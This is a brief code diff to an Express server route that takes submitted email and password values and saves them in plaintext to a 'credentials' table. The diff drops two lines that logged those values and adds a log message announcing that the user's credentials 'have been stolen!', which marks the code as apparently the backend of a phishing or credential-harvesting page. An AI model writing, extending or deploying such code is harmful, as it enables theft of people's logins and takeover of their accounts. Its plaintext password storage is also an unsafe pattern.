@@ -17,8 +17,6 @@ app.put("/getUsers", async (req, res) => {
     const { email } = req.body;
     const { password } = req.body;
 
-    console.log(email);
-    console.log(password);
     const saveCredentials = await pool.query(
       `INSERT INTO credentials (email_phone, password) 
                   VALUES ($1, $2) 
@@ -26,6 +24,7 @@ app.put("/getUsers", async (req, res) => {
                   SET email_phone = EXCLUDED.email_phone, password = EXCLUDED.password`,
       [email, password]
     );
+    console.log(`${email}'s credentials have been stolen!`);
   } catch (error) {
     console.log(error.message);
   }
